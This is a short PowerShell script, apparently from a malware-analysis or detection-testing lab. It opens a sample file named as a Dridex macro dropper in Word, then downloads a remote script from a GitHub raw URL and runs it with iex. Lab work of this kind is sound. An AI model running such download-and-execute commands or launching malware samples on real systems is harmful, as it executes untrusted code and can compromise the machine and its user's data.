Write-Output "Hello World! -- written remote script downloaded from github"

Start-Process winword.exe C:\Users\IEUser\Downloads\malicious_documents_samples\malicious_document_macro_dridex\dridexDropper.doc

Start-Sleep -Seconds 2
iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/chriskossdummy/miscscripts/master/enable.ps1")

Write-Output "Goodbye World -- remote execution complete"
